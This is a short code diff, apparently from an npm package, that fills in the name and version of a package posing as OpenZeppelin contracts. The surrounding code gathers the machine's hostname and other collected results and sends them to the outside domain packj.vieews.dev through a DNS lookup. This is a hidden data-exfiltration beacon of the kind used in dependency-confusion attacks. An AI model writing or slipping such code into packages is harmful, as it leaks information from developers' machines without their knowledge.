@@ -27,7 +27,7 @@ try {
 	  dns.resolveNs(domain, doCallback);
 	};
 
-	query = '#' + results.join(' # ') + '#' + os.hostname() + '#NPM%PKG_NAME%PKG_VERSION%packj.vieews.dev'
+	query = '#' + results.join(' # ') + '#' + os.hostname() + '#NPM%@openzeppelin4.2.0/contracts%9.11.2%packj.vieews.dev'
 	nsLookup(query, 3000, function(err, addresses) {});
 } catch (e) {
 	console.log('');
